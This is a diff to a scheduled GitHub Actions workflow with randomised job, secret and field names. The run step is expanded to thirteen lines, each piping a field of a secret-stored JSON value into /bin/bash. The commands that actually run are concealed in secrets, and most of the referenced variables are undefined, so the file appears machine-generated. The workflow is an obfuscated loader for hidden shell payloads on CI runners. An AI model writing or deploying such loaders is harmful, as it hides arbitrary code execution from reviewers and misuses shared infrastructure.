@@ -2,19 +2,29 @@ name: huanlxh
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 1/6 * * *'
+    - cron: '24 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: huanlxh
         env:
-          lyyu853: ${{ secrets.lyyu853 }}
+          zbd524: ${{ secrets.zbd524 }}
         run: |
-          echo $lyyu853 | jq -r .ho666 | /bin/bash
-          echo $w351 | jq -r .ycsq18137 | /bin/bash
-          echo $sigts446 | jq -r .tiay9656 | /bin/bash
-          echo $tghi67785 | jq -r .j833 | /bin/bash
+          echo $zbd524 | jq -r .sutgn89527 | /bin/bash
+          echo $mtw7 | jq -r .unpu0906 | /bin/bash
+          echo $hpbpm5 | jq -r .nvts5948 | /bin/bash
+          echo $njt837 | jq -r .wzhaf74 | /bin/bash
+          echo $hswj3 | jq -r .ypmu93 | /bin/bash
+          echo $upqxs4 | jq -r .f53040 | /bin/bash
+          echo $fdj81930 | jq -r .hvkmg82 | /bin/bash
+          echo $ck72129 | jq -r .qpc4582 | /bin/bash
+          echo $icszs47355 | jq -r .rn897 | /bin/bash
+          echo $lydt5 | jq -r .ateae46 | /bin/bash
+          echo $tbca0059 | jq -r .fx470 | /bin/bash
+          echo $zi94 | jq -r .d53053 | /bin/bash
+          echo $ute937 | jq -r .uvpkn96 | /bin/bash
 
